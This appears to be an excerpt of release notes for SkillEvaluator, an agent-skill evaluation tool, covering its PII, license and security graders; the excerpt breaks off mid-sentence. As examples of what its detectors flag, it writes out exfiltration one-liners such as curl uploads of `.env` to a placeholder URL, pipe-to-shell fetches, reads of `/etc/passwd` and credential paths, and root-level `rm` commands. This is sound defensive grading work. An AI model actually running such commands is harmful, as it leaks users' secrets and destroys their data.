- Plain removal of recognized regenerable caches no longer receives the Tier 3
  destructive-command penalty. Dynamic commands, mixed targets and other
  destructive operations retain their existing classification in both verifiers.

- Rubric evaluation preserves the original `SKILL.md` text without adding YAML
  separators and includes reachable local Markdown guides under their source
  paths. Required guidance is collected before optional previews, with cycle
  detection, secure contained reads, verified file-alias deduplication, a
  256-document ceiling, and the existing
  3,000-byte per-file / 30,000-byte supplementary limits. Missing, unsafe, or
  oversized required guidance stops judging without a score or provider request
  ([#233](https://github.com/NVIDIA/SkillEvaluator/issues/233)).

- PII credential findings mask their values and source lines. GitHub CI stages
  scanner output privately, redacts recognized credential values from retained
  reports and logs, and withholds detailed output when redaction cannot finish.
- Local Claude Code trials retain Harbor's instruction environment variables so
  prompts reach `claude --print`. The exception accepts only the legacy
  `HARBOR_INSTRUCTION` name and Claude Code's UUID-named instruction variable;
  protected paths, loader controls, and unrelated Harbor variables retain their
  existing filtering ([#245](https://github.com/NVIDIA/SkillEvaluator/issues/245)).

- Tier 3 reports preserve unavailable evaluator lift as `null` when no baseline
  ran, rather than reporting a measured zero. CLI evaluator tables display
  missing or unavailable scores as `n/a` without interrupting JSON and HTML
  report generation; measured zeroes retain their numeric formatting
  ([#240](https://github.com/NVIDIA/SkillEvaluator/issues/240)).

- Tier 3 HTML reports no longer label a recorded baseline as missing. When an
  agent or dimension has a baseline score but no comparable lift, for example
  because the arms used different score policies or no case kept matching judge
  models, the dimension grid, agent scorecards, and Skill Lift card now say
  "comparison unavailable" instead of "no baseline". Rows with no baseline
  score, such as `--skip-baseline` runs, keep "no baseline".

- Explicit searches of `/` (`find`, `grep -r`, `rg`, `ag`, `du` and `tree` with a
  `/` operand, and native search tools rooted at `/`) now count as wasted tool
  calls whether or not they name the expected skill or script, including when
  output is redirected or the search runs inside `sh -c`. Host and bundled
  scoring agree, while scoped searches and slash-valued patterns retain their
  classification.

- On the native Claude API, the Tier 3 judges' `judge_model_used` names the
  server-side fallback model when the API serves a repeated request straight
  from that model. Such a reply has no `fallback` content block, so the label
  now comes from the reply's own `model` field instead of the configured
  model. `judge_fallback_used` is then `true`, and Skill Lift treats such a
  case like an in-call fallback: when another condition, attempt or step of
  the case was judged by the configured model, the case leaves that judge
  metric's lift and is counted in `judge_mixed_cases`.
- Tier 2 `similarity-check` and `context-optimization-check` no longer abort
  with a "symlink or reparse point" error when a skill or collection aliases
  one agent directory to another, such as `.agents -> .claude`. A directory
  link whose name is not a scanned file type and whose relative target is a
  regular directory found by the same scan is skipped without being followed,
  so the target directory is scanned once. Absolute links and Windows
  junctions, broken or escaping links, links to the scan root or one of the
  alias's parent directories, `..` after a named component, and aliases that
  point at another link remain rejected.

- Tier 3 `claude-code` trials no longer hang until the agent timeout after the
  agent has already answered. Claude Code moves a shell command that outlasts
  its Bash timeout to the background, and a headless run waits for background
  commands before it exits, so a command that never finishes (for example a
  `grep -r /` search for a missing skill) held the trial open and the case was
  recorded as an unscored agent timeout. Generated and native tasks now set
  `CLAUDE_CODE_DISABLE_BACKGROUND_TASKS=1` in the task environment for every
  env mode, so each command finishes in its turn or is stopped at Claude Code's
  Bash timeout (2 minutes unless the agent requests a longer one). Neither
  `harbor.runtime_env` nor a native task's `[environment.env]` can turn
  background tasks back on, and other agents ignore the variable. A skill whose
  single commands need longer can raise Claude Code's default with
  `BASH_DEFAULT_TIMEOUT_MS` in `harbor.runtime_env`.

- PII scans no longer report Luhn-valid timestamps and digests as CRITICAL
  credit cards that fail `validate` and `pii-scan`. A number is skipped when a
  label such as `timestamp_microseconds:`, `event_timestamp:`, `unix_time`,
  `epoch_us`, `sha256:`, or `checksum=` directly precedes it, or when it sits
  inside a longer ASCII identifier or hex token such as `id_1707938736269577`;
  a card after a payment word and an underscore (`card_4532015112830366`,
  `cc_...`), in Markdown underscore emphasis (`_4532015112830366_`), after a string
  escape such as `\n` or a percent-encoded byte such as `%3D`, or written
  directly next to Chinese, Japanese, or Korean text is still reported. Known
  test card numbers, now including other widely published test cards such as
  `4242424242424242` and `5555555555554444`, are excepted however their digits
  are grouped (`4111 1111 1111 1111`). They no longer hide a different card
  number on the same line, so a card listed next to a test card is now
  reported. The exponent of a scientific-notation value such as
  `1.000000e+00` is no longer reported as an international phone number.
  GPS-shaped decimal pairs now need a geospatial cue (GPS, latitude/longitude,
  lat/lng, `latlong`/`lonlat` keys, WGS 84, a `geo:` URI, a Google, Apple,
  OpenStreetMap, or Bing map link, a GeoJSON geometry, `Feature`, or collection
  type or `"geometry"` member, or location, office, address, or degrees, also
  in plural, numeric-suffix, snake_case, or camelCase forms such as
  `locations:`, `lat1`, or `homeLocation`) on the line, on one of the two lines
  before it, or in the file name, so waypoints, poses, quaternions, and
  calibration vectors are no longer reported as location data. Every position
  inside a GeoJSON geometry's `coordinates` array written as JSON, a Python
  dict, or a JS object is still reported. Pairs without a cue, such as
  `coordinates: 37.7749, -122.4194` or `Meet me at 37.7749, -122.4194`, are no
  longer reported either.

- A Tier 3 `claude-code` trial that the model provider's safety classifier
  stops now ends as Harbor's typed `AgentSafetyRefusalError` on the selected
  model, on the Anthropic API, Bedrock, Vertex AI and gateway routes alike.
  Claude Code 2.1.292 retried such a turn on another model from its own table
  (for example `claude-opus-4-8` after Claude Opus 5.5) under the bare
  Anthropic ID: a route that does not serve that ID, such as a gateway, failed
  with HTTP 403 and an `UnknownApiError`, and where the retry succeeded the
  trial was scored as the selected model although another model finished it.
  Generated and native tasks now set `CLAUDE_CODE_DISABLE_REFUSAL_FALLBACK=1`
  in the task environment for every env mode, and neither `harbor.runtime_env`
  nor a native task's `[environment.env]` can turn the fallback back on. Other
  agents ignore the variable. The variable was checked with Claude Code
  2.1.292, the release Harbor installs; local mode keeps the fallback off only
  if the host's Claude Code honors it. A refused attempt is not scored, like
  any other failed trial, so the arm no longer has complete attempt coverage:
  after one refusal in 20 cases with 3 attempts each, it reports
  `Scored attempt coverage is 59/60` and its execution fails.
  `tier3 evaluate` then exits 1, and so does `validate --block-on-agent-eval`.
  On a route that serves the fallback model, such as the Anthropic API, the
  retry used to finish such an attempt and the arm succeeded, so a run that
  completed before can now fail. Rerun it, or evaluate the refused case with
  another model.

- Tier 1 security scans no longer fail a skill for an exact read-only
  `/etc/passwd` bind mount such as `docker run -v /etc/passwd:/etc/passwd:ro`.
  SkillSpector 2.11.1 and later tags this mount as likely benign but still
  reports a HIGH Credential Access (PE3) finding. That finding is now ignored
  only when it carries both benign-context tags and every `/etc/passwd` on the
  reported source line, read without following links, is the source or target
  of such a mount. The aggregate risk score is recomputed without it. Writable
  or implicit-mode mounts, other paths, same-line reads such as
  `cat /etc/passwd`, aggregated rows, and earlier SkillSpector versions still
  block. Captured SkillSpector 2.13.3 reports cover both mount operands and a
  separate blocking read, and partial LLM-response inspection stays incomplete.
  Static reports are accepted when a provider is available but LLM analysis
  was neither requested nor applied; availability alone is not execution.

- `BENCHMARK.md` score transitions round half-up to one decimal place, keep
  extra decimals for a score near a dimension verdict threshold so it is never
  shown in a higher band (`49.95%`, not `50.0%`), and derive uplift from the
  displayed scores. Whole-percent rounding of each value separately had
  published contradictions such as `58% → 95% (+36 points)` and
  `50% → 50% (+0 points)`. Scores outside 0–1 and invalid recorded baselines
  are shown as `Not available` instead of being published. The public
  benchmark gate (`scripts/ci/check_public_benchmarks.py`) now rejects a
  Results at a Glance cell whose uplift does not equal the displayed difference
  or whose scores are outside 0–100%; consistent whole-number cards from
  earlier releases still pass.

- Tier 3 `custom_only` runs no longer label a condition without a scoreable
  reward, for example one whose attempts all failed, with the standard metric
  set and `skill-evaluator-dimension-mean-v1` policy. That condition's
  `summary.json`, the agent's recorded metrics and score policies,
  `attempt_policy.json`, and the report's score definition now carry the
  `custom-only` metric set and `custom-overall-v1` policy. When a Harbor job
  never started, both conditions' persisted `summary.json` files record that
  metric set and policy. A failed custom-only agent is therefore no longer
  treated as a standard agent. Scores were already cleared for these
  conditions, and observed rewards still determine their own metric set.

- Tier 3 staging no longer fails with `chmod: cannot use dir_fd and
  follow_symlinks together` when it replaces or merges into an existing
  directory or file on Linux hosts whose glibc cannot change a mode without
  following symlinks (glibc before 2.32, or newer glibc without `/proc`). This
  affected, for example, `init-custom-grader` and `init-harbor-task` over an
  existing `evals/` directory. Staging still changes modes without following
  links where the platform supports it. Elsewhere it opens the entry without
  following links, confirms it is the entry it checked, and changes the mode
  through that open descriptor, so a link swapped in is refused instead of
  followed. Only an entry that cannot be opened, such as one its owner cannot
  read, is still changed by name, with an identity check afterwards.

- Local-mode sandbox errors now include Bubblewrap's own failure line when its
  startup probe fails, note that `pivot_root: Operation not permitted` can mean
  an enclosing container's seccomp profile blocks Bubblewrap, and suggest
  `SKILLEVALUATOR_LOCAL_SANDBOX=prefer` alongside `off`.

- PII email scans recognize all RFC 2606 reserved domains, including their
  subdomains, mixed-case forms, trailing dots, and prose ellipses. A local-part
  boundary prevents quadratic rescanning of long excluded addresses. Ordinary
  addresses on the same line and domains that merely resemble placeholders remain detectable
  ([#244](https://github.com/NVIDIA/SkillEvaluator/issues/244)).
- The license check now parses SPDX license expressions instead of splitting
  them on operators. Expressions with unbalanced parentheses, such as
  `(MIT OR Apache-2.0`, were allowed, and dangling or repeated operators were
  only sent to review; both now fail with a HIGH
  `unsupported_license_expression` finding. A malformed value without an
  upper-case `AND`, `OR` or `WITH`, such as `mit or (apache-2.0`, is reviewed
  as an unknown license name instead of being allowed, and `(MIT)` is allowed
  as MIT. A blocked license still fails a value that does not parse, such as
  `GPL-3.0 (or later)` or `(GPL-3.0 OR MIT`. The `+`, `-only` and `-or-later`
  forms of blocked licenses, such as `GPL-3.0+`, `AGPL-3.0+` and
  `LGPL-2.1-only`, and deprecated ids such as
  `GPL-2.0-with-classpath-exception` are blocked instead of passing as unknown
  licenses. `Apache-2.0 WITH LLVM-exception` is allowed through a
  new `allowed_license_exceptions` list, while an unlisted exception such as
  `Commons-Clause` still needs review. An allowed frontmatter expression that
  leaves out the allowed license found in a LICENSE file is now a conflict, as
  a single identifier already was. SPDX headers inside Markdown inline code or
  table cells no longer keep the closing backtick or `|`, and a trailing `;` is
  dropped. Names such as `MIT License` are matched as before.

- A skill that exceeds a Tier 2 context-deduplication work limit (more than
  512 content chunks, too much pairwise comparison work, or an LLM-review limit:
  more than 50 candidate clusters or an oversized per-cluster or total
  review prompt) is now reported as
  **INCOMPLETE** instead of failing with a CRITICAL `chunk_count_limit`,
  `scalar_comparison_limit`, `llm_cluster_count_limit`,
  `llm_cluster_member_limit`, `llm_prompt_size_limit`, or
  `llm_total_prompt_size_limit` finding. Those findings read as duplicate
  content in the skill and showed `FAILED` with "Publication blocked" in
  BENCHMARK.md, and a policy severity override could downgrade them into a pass
  with no duplicate analysis. Exit codes are otherwise unchanged. An execution
  error names the limit, and the JSON report records it under `work_limit`.

- Tier 3 security grading no longer treats `rm -f` or `rm --force` without
  `-r`, `-R`, or `--recursive` as a destructive command. Routine cleanup such as
  `rm -f out.txt && python run.py` or `find . -name '*.pyc' -exec rm -f {} \;`
  received a critical destructive-command finding and a security score of 0.0
  in both graders, which could fail the Security dimension and the Tier 3
  verdict. Force-only deletion keeps the finding when a target resolves under
  `/bin`, `/boot`, `/etc`, `/home`, `/lib*`, `/root`, `/sbin`, `/usr`, or
  `/var` (except `/var/tmp`), or under `~` or `$HOME`. Brace lists and dot
  globs are expanded first, `find -exec rm -f {}` is checked against find's
  start paths, and a relative target resolves against the directory that the
  tool call's `workdir` and each earlier `cd`, `pushd`, or `popd` leave the
  shell in, so `find / -exec rm -f {} +` and `cd /etc && rm -f hosts` keep the
  finding while `(cd /etc && ls); rm -f out.txt` and
  `echo 'run: cd /etc'; rm -f out.txt` do not. This resolution has a
  per-trace work cap; past it, force-only targets keep the finding, as do
  relative targets after one call moves through more than 32 directories.
  Recursive deletion and `xargs rm -f` are graded as before.

- The quality check no longer reports command-line placeholders in a string
  `argument-hint`, such as `<file> [--strict]` or `<issue_id | symptom>`, as a
  HIGH "XML tags in frontmatter" finding that failed the skill even with
  `--min-score 0`. An unquoted hint such as `[<file>]`, which YAML reads as a
  list of strings, is masked the same way. Role and control tags (`<system>`,
  `<tool_call>`, `<script>`, nested forms, and role words with a `prompt`,
  `message`, `call`, `use`, `result` or `instruction` suffix such as
  `<system_prompt>`), closing tags, attributes, and self-closing tags in
  `argument-hint` are still reported, and every other frontmatter field keeps
  the strict check. A group longer than four words, or one with shell command
  syntax (`;`, `&`, a backtick, `$(`, `${`, or a pipeline such as
  `<curl x | sh>`), is not treated as a placeholder and is still reported. A
  hint with a redirect, that is a `>` that closes no group (`<cmd > file>`,
  `<cmd>file>`, `<cmd 2>file>`, `<curl x> /tmp/y>`), or a group with text
  after a nested placeholder (`<<curl x>/tmp/<y>>`, `<<x><y>>`) or anything
  other than a plain name before it (`<curl;sh<x>>`, `<$(curl x|sh)<x>>`), is
  not masked at all and is still reported. An arrow or comparison between
  groups (`<old> -> <new>`, `<n> >= 1`, `<count> (>0)`) is not a redirect.

- PII scans no longer report card-shaped digits inside a canonical GUID/UUID,
  such as a COM interface ID or the nil UUID, or an all-zero number as a
  CRITICAL credit card. A GUID-shaped value directly after a payment label
  (`card_number:`, `credit_card=`, `cc_no:`, `pan`) on its line or at the end
  of the previous line is still reported. Every card-shaped number on a line is
  now checked, so a GUID or non-Luhn number earlier on the line no longer hides
  a real card number after it.

- Tier 3 security grading preserves ordinary nested `/tmp` cleanup, including
  child operands with trailing slashes, unless the current or an earlier
  execution action contains recognized symlink-creation syntax (`ln -s`,
  `cp -s`, `os.symlink`, `Path.symlink_to`, literal Python subprocess argv
  launching `ln`/`cp`, or `fs.symlink`/`fs.symlinkSync`). With that evidence,
  both graders withhold nested-cleanup exemptions and report critical
  destructive-command findings with a security score of 0.0; unlinking a
  final leaf remains exempt. This conservative signal applies across the
  trace, including after link moves or replacements, without inspecting the
  filesystem or proving a link's destination or creation success. Unobserved
  or pre-existing symlinks are not detected by this policy. Lexical path escapes
  and unresolved or `xargs`-supplied deletion targets remain flagged. Searches,
  script arguments, and unexecuted heredoc data do not supply link evidence;
  Python and Node call syntax is inspected only in executable inline source
  or a recognized program supplied directly through standard input. Comments
  containing apostrophes do not hide actual link calls. Later and multiple
  heredocs, `cat` pipelines into interpreters, and common shell startup options
  retain link detection. Plain `;`, `&&`, `||`, and newline sequences apply
  evidence in command order, so later link creation does not regrade earlier
  cleanup in the same call. Loops, functions, traps, background jobs and other
  compound syntax keep conservative whole-action evidence; unrelated link
  creation can still affect later nested cleanup and remains a policy tradeoff.
- Tier 3 security grading no longer grants temporary-cleanup exemptions to
  destructive `rm` commands launched through `xargs`, whose additional targets
  may come from standard input or an argument file. Both graders recognize
  common options and wrappers while preserving separate cleanup commands.
  Input contents are not evaluated, so this conservative policy also flags
  legitimate scoped cleanup such as
  `find /tmp/cache -name '*.pyc' | xargs rm -f` as a critical destructive-command
  finding with a security score of 0.0.
- Tier 3 security grading now normalizes deletion targets before exempting
  temporary-directory cleanup. Paths such as `/tmp/../workspace` and commands
  mixing temporary and non-temporary targets receive destructive-command
  findings in both the host checker and bundled Harbor verifier. Destructive
  `rm` fragments with no parsed target are also flagged, preserving detection
  of deletions assembled from strings. Temporary cleanup inside backtick
  command substitutions, or followed by shell comments and file-descriptor
  redirections, no longer produces false destructive-command findings. Targets
  after heredoc and here-string redirections are still checked; the input word
  of a redirection is not treated as a deletion target.
  Case-arm/subshell terminators and unrelated comments, ANSI-C literals, or
  heredoc data no longer remove the cleanup exemption. Command substitutions
  used as redirection words do not hide later deletion targets. Unquoted
  `/tmp` deletion targets containing variables, command substitutions, or
  brace expansions (for example standalone `rm -rf /tmp/build-$$`) no longer
  get the cleanup exemption because their destinations remain unresolved.
  Operandless `xargs rm` invocations remain detectable when unrelated syntax
  or parser budgets prevent a complete parse; the fallback uses a bounded
  command span to avoid excessive backtracking on long actions.
- Tier 3 security grading no longer gives a critical finding and a security
  score of 0.0 when an agent uses `apply_patch` to write a workspace file that
  only resembles a protected path. The `.aws/credentials` and `.config/gcloud`
  entries now match a patch target with a directory prefix only in a home
  directory (`~/`, `/root/`, `/home/<user>/`, `/Users/<user>/`,
  `C:\Users\<user>\`, `%USERPROFILE%`), after the existing workdir, `cd`, `~`
  and `$HOME` resolution. That resolution now reads a bare `cd` as the home
  directory, skips `cd`/`pushd` options, leaves the directory unchanged for
  `pushd -n`/`popd -n`, reads `/proc/self/root`, `/proc/<pid>/root` and similar
  aliases as `/`, and reads `/proc/self/cwd` as the call's working directory
  and `/proc/<pid>/cwd` as an unknown one. A relative header that itself starts
  with one of these names (`.aws/credentials`, `./.config/gcloud/adc.json`) is
  still flagged whatever directory it resolves against. When the shell decides
  the directory at run time (`cd "$DIR"`, `cd ${HOME:-/root}`, `cd -`, `popd`,
  a variable `workdir`, an operand with quotes or backslashes the shell
  removes, a `cd` inside a subshell, pipeline, branch, quoted `-c` script or
  `||`/`&&` list that may not run, or a `CDPATH` assignment), these entries
  keep the existing match anywhere in the path, and a relative header such as
  `.bashrc` is also checked as a home path. A project file or test fixture such
  as `project/.aws/credentials` is no longer a `sensitive_file_write`; a
  Windows home path such as `C:\Users\<user>\.bashrc` and a `/proc/<pid>/root`
  or `/proc/<pid>/cwd` alias of a protected path now are. A shell `apply_patch`
  now scores like the tool call: the command-text path checks
  skip the file header lines of an argv patch and of a heredoc body fed to
  `apply_patch` (as a `cmd` string or in the `["bash", "-lc", script]` argv
  form), so headers such as `docs/.config/gcloud-setup.md` no longer raise
  `sensitive_path_access`. Header paths that hold shell syntax (`;`, `&`, `|`,
  `<`, `>`, `(`, `)`, `$`, a backtick or `~`) or a word that is itself a
  protected path (`x /root/.ssh/id_rsa`) are always checked, and so is every
  header when the command, or any other word of an argv command, pipes,
  redirects or captures `apply_patch`'s output, including through a `coproc`,
  since that output names each added file.
  Header-shaped lines elsewhere in the command, a heredoc body that a shell
  expands or runs (an unquoted body holding `$`, a backtick or a backslash),
  and heredocs whose extent is uncertain (mixed delimiter quoting, a missing
  terminator, a comment or ANSI-C quote before the operator, or another use of
  the `apply_patch` name) are still checked, as is a `bash -lc "..."` string
  inside a `cmd`. Read and Write tool paths and other shell commands keep the
  existing credential-path matching.
- Tier 3 error recovery now scores unrecovered command failures as zero and
  includes them in fault counts and failure verdicts/report reasons. Host and
  bundled verifier detection agree and use a result's execution status when it
  has one: a Codex exit code, a whole `exit code N` line, or Harbor marking a
  Claude Code result as successful. Only results without a status, such as
  OpenCode's, are judged by their text: tracebacks, `error:` lines, pytest,
  jest, go test, tsc and npm failures and OpenCode's timeout note count, while
  `0 errors`, exception handlers, numeric timeout settings and type annotations
  do not. Exit-1 probes with no other output (`grep`, `rg`, `test`, `diff`,
  `cmp`, `command -v`, `which`, `git diff --quiet`, including `grep -c` zero
  counts, `/dev/null` redirects, a leading `cd` or `pwd` and pipelines) remain
  clean. Recovery matches whole command words after a leading `cd`; beyond the
  original five-call retry window, only a successful repeat of the same command
  and arguments counts.
- Catalog validation now includes nested and lowercase skill manifests, skips
  generated directories, and stops at skill boundaries to avoid validating
  bundled templates as separate skills. External linked directories containing
  skills and unreadable directories appear as failures without stopping other
  skills; links back into the catalog are ignored. Linked manifests retain
  direct-target behavior, plugin discovery errors produce findings, and reports
  and external Tier 3 results preserve catalog-relative paths for skills with
  the same basename.
- Tier 3 runs now write a Tier 3-scoped `tier3-benchmark.md` alongside HTML,
  named so publication tooling does not treat it as a `BENCHMARK.md` card. It
  states that Tiers 1 and 2 are not covered by the report, separates the Tier 3
  result from an unassessed publication decision, and displays a completed
  agent's score and comparable lift when another agent fails. Failure warnings and the full publication checks remain unchanged.

- Changing finding severities through a policy no longer clears an independent
  quality-score threshold failure. A score below `--min-score` still fails,
  and its reason appears in the terminal, HTML, benchmark, and JSON reports.
- Tier 3 on Windows passes `PROGRAMFILES`, `PROGRAMW6432` and `PROGRAMDATA` to
  Harbor, so Docker Desktop finds its `compose` plugin, and passes
  `PYTHONUTF8` and `PYTHONIOENCODING` so Python UTF-8 mode reaches Harbor on
  non-UTF-8 locales.
- On native Windows, generated Tier 3 `test.sh` files and the grader starters
  from `init-custom-grader` and `init-harbor-task` are now written with LF line
  endings. They were written with CRLF, which broke the `#!/bin/bash` shebang
  and `set -euo pipefail` in the Linux container, so the verifier failed
  before grading. The repository's `.gitattributes` also keeps `*.sh` files LF
  in Windows checkouts.
- A `SKILL.md` `metadata` value that is not a mapping, such as `true`, `1.5`, a
  date, or a list or string containing `author` or `tags`, no longer crashes
  the quality check with a `TypeError`, which aborted `validate`, `tier1`, and
  `quality-check` before any report was written. The schema check reports the
  malformed `metadata`, and the quality score counts `metadata.author` and
  `metadata.tags` as missing, as it already did for other non-mapping values.
- The Tier 1 SkillSpector scan of a skill that references PNG or JPEG images,
  such as a logo shown with `![Logo](assets/logo.png)`, is no longer
  `INCOMPLETE` only because SkillSpector's text pattern analyzers cannot read
  images and report the analysis as `partial`. That gap is now a warning when
  the report shows no other gap and no fatal scope exclusion, and each image
  is a regular, single-link (not hard-linked), non-executable file whose bytes
  have the chunk or marker structure of a PNG or JPEG, is not reached through
  a symlink, and is not in a directory that agents run, load as instructions
  or read as configuration. The gap is accepted for at most 256 images and
  128 MiB of image data in total. The structure check corroborates the file
  type without decoding the image or proving that it renders. PNG IDAT
  compressed data and ancillary chunks, and JPEG entropy-coded data and APPn
  or COM segments, are not inspected and can still carry other bytes. Other
  image formats, files without that structure, and every other partial reason
  still leave the scan `INCOMPLETE`. SkillSpector's own High `AE1` findings for
  images it could not inspect are unchanged.
- Tier 3 `--stop-on-pass` runs with local-mode Codex no longer fail to finalize
  when Harbor's best-effort Codex cleanup is skipped, for example after a
  timeout or cancellation. Merging the per-attempt jobs now omits the leftover
  `codex-home` and `codex-secrets` directories in each trial's `agent/` or
  `steps/<step>/agent/` directory, including steps whose names span several
  path components, such as `phase/author`, as declared in the trial's
  `result.json`. Their linked `auth.json` made the merge fail closed, and a
  regular-file `auth.json` was copied into the merged job with the Codex
  credential. Symlink and hard-link checks still apply everywhere else,
  including to the same names at any other depth.
- A `SKILL.md` over the recommended 5,000-token budget now gets a MEDIUM
  `quality_efficiency` finding instead of a HIGH one. The HIGH finding failed
  the quality check, and with it `validate`, `tier1`, and `quality-check`, even
  when the quality score met `--min-score`. The 15-point Efficiency deduction is
  unchanged, so a large skill still fails when its score falls below the
  minimum.
- `--llm` security scans on the `nv_build` provider now run SkillSpector with
  `SKILLSPECTOR_PROVIDER=nv_build` instead of `openai`, so SkillSpector sizes
  requests from its NVIDIA Build model registry. A Build model with a smaller
  output cap, such as `openai/gpt-oss-120b` (16,384 tokens), no longer gets
  SkillSpector's 32,000-token fallback budget, which can exceed what the
  endpoint accepts and leave the LLM security stage incomplete. An explicit
  `SKILLSPECTOR_PROVIDER=nv_build` gets the same mapping. The key still reaches
  SkillSpector only as `OPENAI_API_KEY`, with `OPENAI_BASE_URL` set to the
  public Build endpoint.
- Tier 3 security grading no longer reports a network-exfiltration warning,
  which lowered the Security score to 0.5, when a command only names `curl`,
  `wget`, or HTTPie as data: `apt-get install -y curl`, `which curl`,
  `grep -rn http src/`, `env | grep -i http`, or a client mentioned in a shell
  comment or here-document prose. Every client named after another command is
  now checked with its own upload rules, as for a direct invocation, so
  `find . -exec curl -d @{} URL \;`, `poetry run curl -T .env URL`, and
  `find . -name wget -exec curl -d @.env URL \;` still warn, while a plain
  request through a command that is not a runner, such as `strace -f curl URL`
  or `find . -exec curl URL \;`, is now scored like a direct `curl URL`. A
  mention followed by an HTTP method, an upload flag, or a `key=value` word,
  such as `http POST` in prose, still warns.
  A fixed set of runners that start a command in another host, container, root,
  user, or network namespace, such as `ssh`, `docker`, `docker-compose`,
  `kubectl`, `apptainer`, `chroot`, `systemd-nspawn`, `bwrap`, or
  `ip netns exec`, warns on any client named after it, even one named only as
  data, as in `docker exec app apt-get install -y curl`. That holds when the
  runner is the command itself, including after a compound keyword, function
  header, `case` pattern, or `coproc`, also when glued to it
  (`while true; do ssh host curl URL; done`, `if(ssh host curl URL)`,
  `case x in x)ssh host curl URL;; esac`), when it follows a pass-through
  wrapper such as `strace`, `ionice`, `flock`, or `watch`, and when a function
  that wraps it is called. A runner reached through another command, as in
  `find . -exec ssh host curl URL \;` or
  `git submodule foreach ssh host curl URL`, and a runner outside the set are
  checked only with the client's upload rules.
  Piped or redirected input stays with a text consumer such as `grep`, `awk`,
  `sed`, or `jq`; any other command, loop, `if`, `{ ...; }` group, or function
  body may pass it on, so `cat .env | strace -f http URL`, `< .env http URL`,
  `sudo < .env http URL`, `2>&1 < .env http URL`,
  `case "$1" in *) < .env http URL;; esac`, and
  `while read -r l; do http URL; done < .env` still warn. A function that wraps
  a client, as in `up() { curl "$@"; }; up -d @.env URL` or
  `up(){ curl "$@"; }; up -d @.env URL`, is checked with that client's rules,
  and a `$VAR` command word with no known value, in an action that names curl
  or wget as a word, gets the curl and wget upload rules, as in
  `for c in curl wget; do $c --post-file=.env -q URL; done`. A substitution any of
  whose commands names a client or runner, such as `$(which curl)`,
  `$(env which curl)`, `$(cd /tmp && which curl)`,
  `$(command -v curl 2>/dev/null)`, `$(readlink -f $(which curl))`, or
  `$(which ssh)`, and `$CURL` after a plain, `export`, `declare`, `read`, or
  `printf -v` assignment, resolve to that command; a fallback chain such as
  `$(command -v wget || command -v curl)` is checked once for each name. A
  command printed by `$(echo curl -d @.env URL)` or `$(printf ...)` keeps its
  printed arguments. Both the host checker and the bundled Harbor verifier
  apply these rules.
- Tier 3 plain progress output, which `--progress auto` selects for CI and
  redirected logs, now repeats its `still running` heartbeat every 60 seconds
  instead of every second, so long runs no longer add thousands of identical
  lines per hour. The interactive Rich view still refreshes every second. A
  new `--progress-interval SECONDS` option on `tier3 evaluate` and `tier3 PATH`
  sets the interval explicitly for either view (0.05 to 86400 seconds;
  non-finite values are rejected).
- SkillSpector runs are no longer stopped after a fixed 300 seconds, which ended
  slow `--llm` security scans, such as those on local models, as `INCOMPLETE`
  before SkillSpector's own scan deadline (1,080 seconds in v2.13.3). Each run
  now has a 1,200-second watchdog by default; set
  `SKILLEVALUATOR_SKILLSPECTOR_TIMEOUT_SECONDS` to a positive integer to change
  it (values above 86400 are capped). `SKILLSPECTOR_MAX_WORKFLOW_SECONDS` is now
  forwarded to SkillSpector so its own deadline can be raised as well, and the
  security result records the effective `skillspector_timeout_seconds`
  ([#155](https://github.com/NVIDIA/SkillEvaluator/issues/155)).
- An `--llm` security scan whose LLM provider keeps failing after
  SkillSpector's bounded retries no longer reports only
  `skillspector-llm failed with unexpected exit code 2: scanner diagnostics were redacted`
  (or `skillspector reported execution_successful=false`). When every failure
  in the SkillSpector v2.12.0+ report is an `llm_connection_retries_exhausted`
  row on an LLM analyzer, the error says that the provider kept failing, that
  this is a retriable provider failure rather than a security finding, and
  that the full scan should be retried when the provider is available. Mixed,
  truncated, malformed or older reports keep the generic error. The scan stays
  `INCOMPLETE` with a nonzero exit, and static findings still decide a
  `FAILED` result.
- `similarity-check --catalog` and `tier2 --catalog` no longer report a skill
  that is already in the local catalog as an `EXACT_DUPLICATE` of its own
  entry, which failed the run. An entry is skipped as the skill's own only when
  its content fingerprint matches, its path ends the skill's path, and more
  than half of up to eight other catalog skills, spread evenly across the
  catalog's path-sorted list, are present unchanged at their recorded paths
  around it. The skip is recorded under
  `self_matches_excluded` and `excluded_catalog_paths`. Verbatim copies and
  same-name skills outside the catalog's tree are still reported; a copy of
  most of the tree, such as a second checkout, counts as the same tree. An
  edited skill whose name, description, or (with `--full-body`) `SKILL.md`
  changed is still compared with its old entry; build the catalog from the tree
  you screen.
- Tier 2 deduplication no longer fails a content cluster when the model wraps
  its JSON verdict in prose, puts a fenced block after a short preamble, or
  writes the fenced block on one line. Such replies come from prompt-only JSON,
  which Bedrock always uses and other providers fall back to after rejecting
  the structured-output schema; they previously failed with
  `LLM returned invalid JSON` (or an `IndexError` for the one-line fence) and
  left Tier 2 incomplete. Exactly one embedded JSON object is accepted. Replies
  with several objects are still rejected instead of guessed, and an object
  inside an array or a malformed container is never used as the verdict. As in
  the Tier 3 judge, an object with a repeated key, a `NaN` or `Infinity` value,
  a number that overflows a float or more than 128 levels of nesting is
  rejected, whether it is the whole reply or embedded in prose.
- Tier 3 HTML reports now explain failing evaluator scores. A failing
  evaluator card opens its per-trial evidence, shows the grader's reason
  (or, when the grader recorded none, its message, findings, or failed
  criteria), and quotes a short excerpt of the offending command or artifact.
  A failing cell in the per-evaluator drill-down shows the reason as a
  tooltip. When attempts of one case disagree, the card shows the
  lowest-scoring attempt's reason, so a passing attempt no longer hides a
  failure. Grader reasons and excerpts are credential-redacted, including
  the values of configured credential environment variables. Criteria the
  grader excluded from the score are not listed as failed. Drill-down
  reasons and excerpts are capped at 240 and 300 characters, and
  secret-detector findings never quote their detection pattern back.
  Large reports drop these reasons before any other detail, so they never
  displace the HTML overview or recorded evidence.
- The Tier 3 HTML size notice no longer prints `<built-in method items ...>`
  in place of the number of items the preview omitted.
- Ctrl+C during `tier3 evaluate` now stops the run. The interrupt reached only
  the coordinating thread, so running Harbor jobs kept going in their own
  process groups, agents waiting for a `--max-agents` slot still started, and
  the command appeared to hang until every job finished. Queued agents,
  conditions, and `--stop-on-pass` attempts now never start. Each running
  Harbor job receives SIGTERM and up to 30 seconds to stop its trial
  environments, such as Docker containers, before its process group is
  killed; a second Ctrl+C skips that wait, and on Windows the task tree is
  stopped immediately. Progress shows the agents that are stopping and reports
  the run as interrupted instead of failed unexpectedly.
- The prompt-based `goal_accuracy` judge, which runs whenever the RAGAS scorer
  does not (including with the default NVIDIA Build provider), used the reply's
  `score` field over its `achieved` verdict, so `achieved: false` with
  `score: 1.0` scored 1.0. Other judge replies were also accepted when they
